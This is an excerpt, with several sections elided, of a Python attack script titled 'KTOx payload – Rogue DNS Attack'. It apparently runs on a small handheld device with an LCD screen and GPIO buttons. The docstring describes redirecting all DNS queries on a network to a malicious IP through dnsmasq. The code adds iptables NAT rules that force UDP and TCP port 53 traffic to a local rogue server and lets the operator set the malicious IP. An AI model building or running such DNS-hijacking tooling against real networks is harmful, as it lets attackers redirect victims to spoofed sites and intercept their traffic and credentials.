#!/usr/bin/env python3
"""
KTOx *payload* – **Rogue DNS Attack**
==========================================
This payload performs a Rogue DNS attack by setting up a rogue DNS server
that redirects all DNS queries to a malicious server.

Features:
- Sets up a rogue DNS server using dnsmasq.
- Redirects all DNS queries to a malicious server.
...
def draw_ui(screen_state="main", message_lines=None):
    ...
    d.text((5, 5), "Rogue DNS Attack", font=FONT_TITLE, fill=(30, 132, 73))
    ...
    if message_lines:
        ...
        d.text((5, 50), f"Malicious IP: {MALICIOUS_IP}", font=FONT, fill=(242, 243, 244))
        d.text((5, 100), "OK=Start", font=FONT, fill=(171, 178, 185))
        d.text((5, 110), "KEY1=Iface | KEY2=IP", font=FONT, fill=(171, 178, 185))
        ...
        d.text((5, 85), f"Malicious IP: {MALICIOUS_IP}", font=FONT, fill=(242, 243, 244))
...
"""
    ...
    subprocess.run("iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 127.0.0.1:53", shell=True)
    subprocess.run("iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to 127.0.0.1:53", shell=True)
...
if __name__ == "__main__":
    try:
        while running:
            ...
            if GPIO.input(PINS["KEY2"]) == 0:
                new_ip = handle_text_input_logic(MALICIOUS_IP, "Malicious IP")
                if new_ip:
                    MALICIOUS_IP = new_ip
                time.sleep(0.3)
        ...
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Rogue DNS Attack payload finished.")
